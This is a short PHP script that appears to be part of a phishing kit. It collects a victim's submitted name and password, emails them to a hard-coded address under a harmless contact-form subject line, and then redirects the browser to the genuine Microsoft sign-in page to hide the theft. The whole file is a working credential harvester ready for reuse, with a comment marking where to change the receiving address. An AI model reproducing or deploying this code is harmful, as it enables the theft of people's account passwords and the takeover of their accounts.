<?php
 
    $to = "info@airkingcourier.com"; //Change email here
    $from = $_REQUEST['email']; 
    $name = $_REQUEST['name']; 
    $headers = "From: $from"; 
    $subject = "You have a message sent from your site"; 
 
    $fields = array(); 
    $fields{"name"} = "name"; 
    $fields{"password"} = "password"; 
 
    $body = "Here is what was sent:\n\n"; foreach($fields as $a => $b){   $body .= sprintf("%20s: %s \n ",$b,$_REQUEST[$a]); }
 
    $send = mail($to, $subject, $body, $headers);

    // echo "<script>alert('Message Sent Successfully');</script>";

    echo '<script>window.location.href = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1621288665&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&lc=2057&id=292666&lw=1&fl=easi2";</script>';
 
?>